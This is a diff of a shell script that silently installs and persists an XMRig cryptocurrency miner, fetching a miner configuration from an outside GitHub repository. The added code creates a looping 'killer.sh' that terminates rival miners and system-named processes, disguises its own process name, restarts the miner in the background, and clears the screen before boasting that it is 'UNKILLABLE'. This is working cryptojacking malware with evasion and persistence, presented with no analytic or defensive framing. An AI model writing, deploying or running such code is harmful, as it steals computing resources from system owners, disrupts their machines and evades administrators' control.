@@ -5,17 +5,14 @@ xmrver="6.22.2"
 if [ -d /tmp ]; then
     echo "/tmp exists"
 else
-    # create tmp if it doesn't exist (yes that happened...)
     sudo -n mkdir /tmp
     sudo -n chmod 777 /tmp
 fi
 
-# remove any aliases
 unalias -a
 
-# try to install wget and util-linux
 sudo -n apt update
-sudo -n apt install -y wget util-linux
+sudo -n apt install -y wget util-linux dos2unix
 sudo -n apk add wget util-linux
 sudo -n dnf install wget util-linux
 
@@ -26,21 +23,40 @@ else
 fi
 
 mkdir -p /tmp/xmrig
-# run the script in /tmp/xmrig, after the script checks if it exists or not
 cd /tmp/xmrig
 
-# use curl because it's present on more distributions
 $DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
 tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
 cd xmrig-$xmrver
 
-# just to be extra safe
 chmod +x xmrig
 
 rm -f config.json
-$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/refs/heads/main/config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/main/config.json
+
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
-sudo -n ./xmrig
-./xmrig
+echo "ANTI-KILLER LOOP ENABLED"
+
+cat <<EOF > killer.sh
+#!/bin/bash
+while true; do
+  pkill -f xmrig
+  pkill -f minerd
+  pkill -f kworker
+  pkill -f kthreadd
+  echo "texniaz" > /proc/\$$/comm
+  if ! pgrep -f xmrig; then
+    nohup ./xmrig > /dev/null 2>&1 &
+  fi
+  sleep 10
+done
+EOF
+
+chmod +x killer.sh
+
+nohup ./killer.sh > /dev/null 2>&1 &
+nohup ./xmrig > /dev/null 2>&1 &
+clear
+echo "TEXNIAZ MINER INSTALLED 💀🔥 - UNKILLABLE 🧠"
